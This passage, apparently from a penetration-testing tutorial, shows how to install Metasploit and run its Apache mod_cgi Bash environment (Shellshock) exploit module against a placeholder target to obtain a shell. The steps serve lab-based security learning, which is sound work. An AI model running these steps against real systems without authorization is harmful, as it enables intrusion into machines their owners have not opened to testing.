, or exploit a vulnerability in an application running on the system. We're going to use Metasploit for this exercise because it is one of the most popular tools used in penetration testing and security research.

First we need to install Metasploit Framework:
```bash
sudo apt-get update
sudo apt-get install metasploit-framework
```

To use Metasploit, open a terminal and type `msfconsole`. Once it opens, you will be presented with a command prompt. You can type `help` to get a list of commands or `search name_of_exploit` to find an exploit.

Now let's say we want to run an exploit that targets a vulnerable web server. We might use the following steps:
```bash
search apache
# This will display all the Apache-related exploits
use exploit/unix/webapp/apache_mod_cgi_bash_env_exec
show options # To show the options we can set for this exploit
set RHOSTS <target ip>  # Set the IP address of the target machine
set RPORT <port number> # If necessary, specify the port on which the web server is running
exploit # Run the exploit
```

Metasploit will then attempt to exploit the vulnerability and give you access to the shell if successful. 

If you're looking for a more advanced penetration testing lab environment, consider setting up Kali Linux or using a cloud service like AWS EC2 with Kali Linux AMI installed.
